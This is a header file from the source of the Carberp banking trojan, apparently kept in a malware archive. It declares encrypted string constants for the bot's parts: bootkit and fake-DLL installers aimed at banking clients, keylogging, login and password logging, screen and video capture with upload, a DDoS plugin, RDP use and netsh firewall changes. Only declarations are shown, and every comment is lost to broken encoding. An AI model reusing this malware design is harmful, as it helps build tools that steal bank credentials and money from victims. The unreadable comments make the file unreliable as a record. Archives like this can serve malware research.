/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

//---------------------------------------------------------------------------
//  ������ �������� ��������� �������� ����
//
//  �������������: ���� 2012
//---------------------------------------------------------------------------

#ifndef StrConstsH
#define StrConstsH
//---------------------------------------------------------------------------

#include "Strings.h"

//��� ���������� ������, ������������� � ���� ����
#ifdef _MSC_VER
#	define CSSTR __declspec(align(1)) char
#else
#	define CSSTR char
#endif

//*****************************************************
// GetStr - ������� �������������� ������ EncryptedStr
//*****************************************************
string GetStr(const char* EncryptedStr);





//=====================================================
//  ��������� ���������� ��������� ������
//
//
//  �������� � ��������� � ��������� EStr -
//  Encrypted String
//=====================================================

// ������� ����������� �������� ����������������, ��� ��� �������
extern CSSTR StrBotGlobalMutexName[];
//������� ���������������, ��� ������� ��� �� ��� �������
extern CSSTR StrBootkitIsRunMutex[]; 


// ������������ ��� ��� ����� ����
extern CSSTR EStrOriginalBotExeName[];
extern CSSTR EStrBotStartupLinkName[];  // ��� ������ � ������������


// ��� ����� ��� �������� ������ ����
extern CSSTR EStrHostsFileName[];


// ��� �������
extern CSSTR EStrServiceName[];

// �������������� �������
extern CSSTR EStrBotServiceExePath[];

// ��� ��� ����� ������� ����
extern CSSTR EStrBotServiceExeName[];


extern CSSTR StrBotWorkPath[];
extern CSSTR StrGrabberPath[];


extern CSSTR EStrConfigFileName[]; // ��� ����� �������� �������
extern CSSTR EStrConfigHPFileName[]; // ��� ����� �������� ������� ����������� ����������



//��� ������ ��������
extern CSSTR EStrSystemPrivat[]; // ������ ������ �����������
extern CSSTR EStrSystemIfobsOnline[]; // ������ ������� Ifobs ������

// ��� �����
extern CSSTR EStrCabNameDisketa[]; // ��� ���� ��� �������� �����������



// ��� ����������� ����� ������������ ���������
extern CSSTR EStrInfiniteKeyLoggerSignal[];


// ����� ��������� ������
extern CSSTR EStrPipeLoader[]; // ��� ���������� ����� �������

// ��������� �������, ������������ ����� ����� ���������
extern CSSTR EStrProcessCommandDeleteBot[];  // ������� �� �������� exe ����


// ��� ���� ��������
extern CSSTR EStrPrefixFileName[];
extern CSSTR EStrTemporaryPrefixFileName[]; // ��������� ���� �������� ��������

// ����� ������� ���� � ���� ���
extern CSSTR EStrBotPlug[];

// ��� ���������� �������
extern CSSTR EStrBootkitInstaller[];

// ��� ����������� �������
extern CSSTR EStrFakeDllInstaller[];
// ��� ����� �� �������� ����������, ��� ����������� ������� (���� � ����� ����)
extern CSSTR EStrFakeDllFlag[];
//��� ����� �� �������� ����������, ��� ����������� ������� � ������� �����
extern CSSTR EStrFakeDllIFobsFlag[];
//��� ����� �� �������� ����������, ��� ����������� ������� � ������� �����
extern CSSTR EStrFakeDllCBankFlag[];

// �������� ������, ������� ����� �������� ���
extern CSSTR EStrCommandInstallFakeDLL[];  // ������� �� ���������� �������
extern CSSTR EStrCommandInstallBootkit[];  // ������� �� ���������� �������



// ����� ������, ��� ���������� � ���
extern CSSTR StrLogFileScreenShot[];
extern CSSTR StrLogFileTextData[];
extern CSSTR StrLogFileNetInfo[];
extern CSSTR EStrLogKeyPath[];


// ������ ����� ����
extern CSSTR EStrLogFieldLogin[];
extern CSSTR EStrLogFieldPassword[] ;
extern CSSTR EStrLogFieldKeyPassword[] ;
extern CSSTR EStrLogFieldURL[];


// ����� ������� ���������� �����������.
extern CSSTR VideoRecFuncInit[];
extern CSSTR VideoRecFuncRelease[];
extern CSSTR VideoRecUpdateSettings[];
extern CSSTR VideoRecFuncAddIPServer[];
extern CSSTR VideoRecFuncRecordProcess[];
extern CSSTR VideoRecFuncRecordWnd[];
extern CSSTR VideoRecFuncStop[];
extern CSSTR VideoRecFuncResetTime[];
extern CSSTR VideoRecFuncSendFiles[];
extern CSSTR VideoRecFuncSendFilesAsync[];
extern CSSTR VideoRecFuncIsSendedAsync[];
extern CSSTR VideoRecFuncFolderIsUpload[];
extern CSSTR VideoRecFuncRunCmdExec[];
extern CSSTR VideoRecFuncSendLog[];
extern CSSTR VideoRecPipe[];
extern CSSTR VideoRecOutOfHibernation[];

// ��������� ������ HTTP
extern CSSTR HTTPFormContentDisposition[];
extern CSSTR HTTPFormFieldName[]; // ������ ������������ ����� ����
extern CSSTR HTTPFormFileInfo[];  // ������ ������ ������������ ���������� � ����� ����� ��� �������� �����
extern CSSTR HTTPOctetStream[];


// ������ ������ AzConfig
extern CSSTR AzConfigParamUserName[];


// ������ ������ BSS �������
extern CSSTR BSSLogTemplate[];


// ������ ������ FakeDllInstaller
extern CSSTR EStrFakeDllInstallerCommandParams[];
extern CSSTR EStrIBankRegistryPath[];
extern CSSTR EStrSberRegistryKey[];
extern CSSTR EStrIBankFileName[];

//����-���� ����������� ����� ������� IFobs
extern CSSTR IFobsFlagCopy[];


// ��� ������� DDOS
extern CSSTR EStrDDOSPlugin[];

// ��� ����� ������ ��� ������� DDOS
extern CSSTR EStrDDOSSignal[];


//������ ���������� ��� ������� RDP
extern CSSTR RDPRunParam[];

//��� BSS CBank �������
extern CSSTR CBankReplacement[]; //��� ����� �������� ��� ���������
extern CSSTR CBankFlagUpdate[]; //���� ��� ������� ������� (��� ������ ���� �������)
extern CSSTR CBankRestFixed[]; //���� � ������� � �������

//��� Tiny
extern CSSTR TinyReplacement[]; //��� ����� �������� ��� ���������
extern CSSTR TinyFlagUpdate[]; //���� ��� ������� ������� (��� ������ ���� �������)
extern CSSTR TinyOldBalans[]; //��� ����� ��� �������� ������������ �������, ��� ��������������
extern CSSTR TinyOldDocs[]; //��� ����� ��� �������� ������ �� ���������� ���������, ��� ��������������

//������� ��� ���������� � ������ ���������� �������������
extern CSSTR NetshFirewallWinXp[]; //��� windows XP
extern CSSTR NetshFirewallWin7Add[]; //��� windows 7 ���������� �������
extern CSSTR NetshFirewallWin7Del[]; //��� windows 7 �������� �������

//*********************************************************************
//                            �� ����������� ������ � ������
//*********************************************************************


extern CSSTR Slash[];
extern CSSTR SlashChar;



#endif
